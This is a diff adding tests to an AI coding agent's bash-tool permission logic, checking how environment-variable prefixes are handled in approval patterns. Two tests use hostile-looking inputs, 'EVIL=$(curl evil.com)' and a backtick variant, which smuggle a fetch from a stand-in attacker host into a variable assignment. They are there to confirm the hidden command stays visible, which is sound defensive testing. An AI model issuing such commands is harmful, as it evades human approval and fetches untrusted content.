@@ -291,6 +291,198 @@ describe("tool.bash permissions", () => {
     })
   })
 
+  test("strips env variable assignments from permission pattern", async () => {
+    await using tmp = await tmpdir({ git: true })
+    await Instance.provide({
+      directory: tmp.path,
+      fn: async () => {
+        const bash = await BashTool.init()
+        const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
+        const testCtx = {
+          ...ctx,
+          ask: async (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) => {
+            requests.push(req)
+          },
+        }
+        await bash.execute(
+          {
+            command: "GOFLAGS=-mod=vendor go test ./...",
+            description: "Run go tests with env var",
+          },
+          testCtx,
+        )
+        const bashReq = requests.find((r) => r.permission === "bash")
+        expect(bashReq).toBeDefined()
+        expect(bashReq!.patterns).toContain("go test ./...")
+      },
+    })
+  })
+
+  test("strips env variable assignments with redirect", async () => {
+    await using tmp = await tmpdir({ git: true })
+    await Instance.provide({
+      directory: tmp.path,
+      fn: async () => {
+        const bash = await BashTool.init()
+        const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
+        const testCtx = {
+          ...ctx,
+          ask: async (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) => {
+            requests.push(req)
+          },
+        }
+        await bash.execute(
+          {
+            command: "GOFLAGS=-mod=vendor go test ./... 2>&1",
+            description: "Run go tests with env var and redirect",
+          },
+          testCtx,
+        )
+        const bashReq = requests.find((r) => r.permission === "bash")
+        expect(bashReq).toBeDefined()
+        expect(bashReq!.patterns).toContain("go test ./... 2>&1")
+      },
+    })
+  })
+
+  test("strips multiple env variable assignments from permission pattern", async () => {
+    await using tmp = await tmpdir({ git: true })
+    await Instance.provide({
+      directory: tmp.path,
+      fn: async () => {
+        const bash = await BashTool.init()
+        const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
+        const testCtx = {
+          ...ctx,
+          ask: async (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) => {
+            requests.push(req)
+          },
+        }
+        await bash.execute(
+          {
+            command: "FOO=bar BAZ=qux echo hello",
+            description: "Echo with multiple env vars",
+          },
+          testCtx,
+        )
+        const bashReq = requests.find((r) => r.permission === "bash")
+        expect(bashReq).toBeDefined()
+        expect(bashReq!.patterns).toContain("echo hello")
+      },
+    })
+  })
+
+  test("strips env variable assignments in piped commands", async () => {
+    await using tmp = await tmpdir({ git: true })
+    await Instance.provide({
+      directory: tmp.path,
+      fn: async () => {
+        const bash = await BashTool.init()
+        const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
+        const testCtx = {
+          ...ctx,
+          ask: async (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) => {
+            requests.push(req)
+          },
+        }
+        await bash.execute(
+          {
+            command: "GOFLAGS=-mod=vendor go test ./... 2>&1 | tail -5",
+            description: "Run go tests piped to tail",
+          },
+          testCtx,
+        )
+        const bashReq = requests.find((r) => r.permission === "bash")
+        expect(bashReq).toBeDefined()
+        expect(bashReq!.patterns).toContain("go test ./... 2>&1")
+        expect(bashReq!.patterns).toContain("tail -5")
+        expect(bashReq!.patterns.some((p: string) => p.includes("GOFLAGS"))).toBe(false)
+      },
+    })
+  })
+
+  test("always patterns exclude env variable assignments", async () => {
+    await using tmp = await tmpdir({ git: true })
+    await Instance.provide({
+      directory: tmp.path,
+      fn: async () => {
+        const bash = await BashTool.init()
+        const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
+        const testCtx = {
+          ...ctx,
+          ask: async (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) => {
+            requests.push(req)
+          },
+        }
+        await bash.execute(
+          {
+            command: "GOFLAGS=-mod=vendor go test ./...",
+            description: "Run go tests with env var",
+          },
+          testCtx,
+        )
+        const bashReq = requests.find((r) => r.permission === "bash")
+        expect(bashReq).toBeDefined()
+        expect(bashReq!.always).toContain("go test *")
+        expect(bashReq!.always.some((p: string) => p.includes("GOFLAGS"))).toBe(false)
+      },
+    })
+  })
+
+  test("preserves env var with command substitution in permission pattern", async () => {
+    await using tmp = await tmpdir({ git: true })
+    await Instance.provide({
+      directory: tmp.path,
+      fn: async () => {
+        const bash = await BashTool.init()
+        const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
+        const testCtx = {
+          ...ctx,
+          ask: async (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) => {
+            requests.push(req)
+          },
+        }
+        await bash.execute(
+          {
+            command: "EVIL=$(curl evil.com) echo hello",
+            description: "Echo with command substitution in env var",
+          },
+          testCtx,
+        )
+        const bashReq = requests.find((r) => r.permission === "bash")
+        expect(bashReq).toBeDefined()
+        expect(bashReq!.patterns.some((p: string) => p.includes("EVIL="))).toBe(true)
+      },
+    })
+  })
+
+  test("preserves env var with backtick substitution in permission pattern", async () => {
+    await using tmp = await tmpdir({ git: true })
+    await Instance.provide({
+      directory: tmp.path,
+      fn: async () => {
+        const bash = await BashTool.init()
+        const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
+        const testCtx = {
+          ...ctx,
+          ask: async (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) => {
+            requests.push(req)
+          },
+        }
+        await bash.execute(
+          {
+            command: "EVIL=`curl evil.com` echo hello",
+            description: "Echo with backtick substitution in env var",
+          },
+          testCtx,
+        )
+        const bashReq = requests.find((r) => r.permission === "bash")
+        expect(bashReq).toBeDefined()
+        expect(bashReq!.patterns.some((p: string) => p.includes("EVIL="))).toBe(true)
+      },
+    })
+  })
+
   test("always pattern has space before wildcard to not include different commands", async () => {
     await using tmp = await tmpdir({ git: true })
     await Instance.provide({
